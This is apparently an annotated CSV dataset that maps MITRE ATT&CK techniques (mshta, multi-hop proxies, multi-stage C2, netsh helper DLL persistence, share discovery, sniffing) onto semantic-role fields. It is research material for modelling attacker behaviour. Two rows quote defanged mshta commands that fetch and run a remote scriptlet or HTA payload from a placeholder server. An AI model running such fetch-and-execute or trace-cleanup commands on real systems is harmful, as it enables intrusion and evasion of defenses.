Id,_0,_1,_2,action_what,action_where,alternative_technique,how,how_what,how_where,postcondition,precondition,tactic,technique,when,when_condition,when_object,where_attribute,why_state,why_what,why_where
t1170,,,375,execute,file,,mshta.exe through an inline script: mshta vbscript:close(execute(getobject(script:https[:]//webserver/payload[.]sct))),,,,,"defense evasion,execution",mshta,,,,,,,
t1170,,,376,execute,file,,urls: mshta http[:]//webserver/payload[.]hta,,,,,"defense evasion,execution",mshta,,,,,,,
t1170,,,377,use,mshta.exe,,,,,,,"defense evasion,execution",mshta,,,,,"<what>bypass<\what> <where>application whitelisting solutions <\where> , <what>bypasses<\what> <where>browser security settings<\where>","bypass , bypasses","application whitelisting solutions  , browser security settings"
t1170,,,378,bypass,browser security setting,,,,,,,"defense evasion,execution",mshta,,,,,,,
t1170,,,379,bypass,application whitelisting solution,,,,,,,"defense evasion,execution",mshta,,,,,,,
t1026,,1,380,split,communication,,,,,,,command and control,multiband communication,,,,,"<what>bypass<\what> certain <where>firewall restrictions<\where> , <what>avoid<\what> <where>data threshold alerts<\where> on any one communication","bypass , avoid","firewall restrictions , data threshold alerts"
t1188,,1,381,chain,multiple proxies,,several proxies,,,smart-card- credential-exposed,,command and control,multi-hop proxy,,,,malicious,<what> disguise <\what> the <where> source <\where> of <attribute> malicious traffic <\attribute>;<what> identify<\what> its <where>source <\where>,disguise/identify,source
t1188,,1,381,chain,traffic,,several proxies,,,smart-card- credential-exposed,,command and control,multi-hop proxy,,,,malicious,<what> disguise <\what> the <where> source <\where> of <attribute> malicious traffic <\attribute>;<what> identify<\what> its <where>source <\where>,disguise/identify,source
t1188,,1,381,trace,multiple proxies,,several proxies,,,smart-card- credential-exposed,,command and control,multi-hop proxy,,,,malicious,<what> disguise <\what> the <where> source <\where> of <attribute> malicious traffic <\attribute>;<what> identify<\what> its <where>source <\where>,disguise/identify,source
t1188,,1,381,trace,traffic,,several proxies,,,smart-card- credential-exposed,,command and control,multi-hop proxy,,,,malicious,<what> disguise <\what> the <where> source <\where> of <attribute> malicious traffic <\attribute>;<what> identify<\what> its <where>source <\where>,disguise/identify,source
t1079,,1,382,perform,c2 communication,,"using multiple layers of encryption , tunneling a custom encryption scheme within a protocol encryption scheme",,,,,command and control,multilayer encryption,,,,,,,
t1104,,1,383,create,command and control channel,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,create,command and control server,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,create,Remote access tool,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,obfuscate,command and control channel,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,obfuscate,command and control server,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,obfuscate,Remote access tool,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,call back,command and control channel,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,call back,command and control server,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,call back,Remote access tool,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,upload,command and control channel,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,upload,command and control server,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1104,,1,383,upload,Remote access tool,,use remote access tool;use multi stage,use,remote access tool;multi stage,,,command and control,Multi-Stage Channels,,,,"multi stage,first stage, second stage","collect basic host information, update tools, and upload additional files; 
redirect the host to the second-stage command and control server","collect, update, upload, redirect","host information, tool, file, host"
t1128,,,384,use,netsh.exe,,"windows registry at hklm\software\microsoft\netsh , helper dlls , vpn software",,,,,persistence,netsh helper dll,"<condition><object>netsh.exe<\object> is executed automatically<\condition> with anotherpersistence technique , if other <condition>persistent softwareis present  on the system that executes <object>netsh.exe<\object><\condition>","<object>netsh.exe<\object> is executed automatically , persistent softwareis present  on the system that executes <object>netsh.exe<\object>","netsh.exe , netsh.exe",,proxy <what>execution<\what> of arbitrary <where>code<\where>,execution,code
t1128,,,385,invoke,netsh.exe,masquerading,,"using , using","system utilities , custom tools",,,persistence,netsh helper dll,,,,,,,
t1128,,,386,load,cobalt strike's payload,,<what>using<\what> <where>netsh.exe helper dlls<\where>,,,,,persistence,netsh helper dll,,,,,,,
t1046,,,387,get-listing,services,,<what>use<\what> <where> port scans tools <\where> and <where> vulnerability scans tools<\where> using tools that are brought onto a system,use,"port scans tools  ,  vulnerability scans tools",,,discovery,network service scanning,,,,running on remote hosts,,,
t1126,,,388,use,net,,net use \system\share /delete command,,,,,defense evasion,network share connection removal,,,,,<what>remove<\what> <where>network share connections<\where>,remove,network share connections
t1126,,,389,remove,share connection,,,,,,,defense evasion,network share connection removal,,,,,<what>clean up<\what> <where>traces<\where> of their operation,clean up,traces
t1135,,,390,contain,shared network drives and folders,,,,,,,discovery,network share discovery,,,,,access file directories on various systems across a network,,
t1135,,,390,use,shared network drives and folders,,,,,,,discovery,network share discovery,,,,,access file directories on various systems across a network,,
t1135,,,391,use,net,,net view \remotesystem command <what> use <\what> <where> net share <\where>,use,net share,,,discovery,network share discovery,,,,,query a remote system for available shared drives  query shared drives on the local system,,
t1135,,,392,look,folders and drives,,locally mounted shares can be viewed with the df -ah command,,,,,discovery,network share discovery,,,,shared  on remote systems,identifying sources of information to gather as a precursor for collection  identify potential systems of interest for lateral movement,,
t1135,,,392,search,folders and drives,,locally mounted shares can be viewed with the df -ah command,,,,,discovery,network share discovery,,,,shared  on remote systems,identifying sources of information to gather as a precursor for collection  identify potential systems of interest for lateral movement,,
t1040,,1,393,place,network interface,,,,,,,"credential access ,discovery",network sniffing,,,,promiscuous mode,passively <what>access<\what> <where>data<\where> in transit over the network,access,data
